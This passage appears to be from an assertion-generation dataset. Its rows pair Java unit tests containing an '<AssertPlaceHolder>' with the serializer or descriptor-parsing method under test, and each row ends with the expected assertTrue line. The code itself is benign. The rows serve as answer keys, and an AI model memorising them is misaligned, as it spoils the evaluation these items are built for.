} boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(ObjectSerializer.deserialize(serialized, long.class) == num)
"Exception { double num = rnd.nextDouble(); String serialized = ObjectSerializer.serialize(num); ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } } boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(ObjectSerializer.deserialize(serialized, double.class) == num)
"Exception { float num = rnd.nextFloat(); String serialized = ObjectSerializer.serialize(num); ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } } boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(ObjectSerializer.deserialize(serialized, float.class) == num)
"Exception { boolean val = rnd.nextBoolean(); String serialized = ObjectSerializer.serialize(val); ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } } boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(ObjectSerializer.deserialize(serialized, boolean.class) == val)
"Exception { byte[] val = new byte[Integer.MAX_VALUE / 5000]; rnd.nextBytes(val); String serialized = ObjectSerializer.serialize(val); ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } } boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(Arrays.equals(ObjectSerializer.deserialize(serialized, byte[].class), val))
"Exception { String val = genText(Integer.MAX_VALUE / 5000); String serialized = ObjectSerializer.serialize(val); String deserialized = ObjectSerializer.deserialize(serialized, String.class); if (!deserialized.equals(val)) { System.err.println(""Failure:\n"" + val + ""\nshould be equal to:\n"" + deserialized); int i = 0; for (char ch : val.toCharArray()) { char ch2 = deserialized.charAt(i++); if (ch != ch2) { System.err.println((int) ch2 + "" was not "" + (int) ch); break; } } } ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } } boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(deserialized.equals(val))
"descriptorTests() { String descs = """"; ArrayList<String> descsArr = new ArrayList<String>();  ConfigurationBuilder conf = ConfigurationBuilder.build(ClassLoader.getSystemClassLoader()); for (Package p : getClass().getClassLoader().getDefinedPackages()) { String rname = p.getName().replace(""."", ""/""); try { Enumeration<URL> roots = getClass().getClassLoader().getResources(rname); for (URL i : Collections.list(roots)) { conf.addUrls(i); } } catch (IOException ex) { } } Reflections reflections = new Reflections(conf); String[] types = reflections.getSubTypesOf(Map.class).stream().map(t -> t.getTypeName()) .toArray(t -> new String[t]);  int l = rnd.nextInt(160); for (int i = 0; i < l; i++) { int arrays = 0; for (int i2 = 0; i2 < rnd.nextInt(30); i2++) { arrays += (rnd.nextInt(4) == 1 ? 1 : 0); } String suffix = """"; String prefix = """"; for (int s = 0; s < arrays; s++) { suffix += ""[]""; prefix += ""[""; } int r = rnd.nextInt(Fluid.descriptors.keySet().size() + (l / 7)); if (r >= Fluid.descriptors.keySet().size()) { String type = types[rnd.nextInt(types.length)] + suffix; descsArr.add(type); descs += Fluid.getDescriptor(type); } else { char c = Fluid.descriptors.keySet().toArray(t -> new Character[t])[r]; descs += prefix + c; descsArr.add(Fluid.descriptors.get(c) + suffix); } } String[] args = Fluid.parseMultipleDescriptors(descs); for (int i = 0; i < descsArr.size(); i++) { ""<AssertPlaceHolder>""; } }
parseMultipleDescriptors(String descriptor) { ArrayList<String> argumentTypes = new ArrayList<String>(); int l = descriptor.length(); for (int i = 0; i < l; i++) { Object[] info = parseDescriptorIntern(descriptor, i, l); i = (int) info[1]; argumentTypes.add(info[0].toString()); } return argumentTypes.toArray(t -> new String[t]); }"	assertTrue(args[i].equals(descsArr.get(i)))
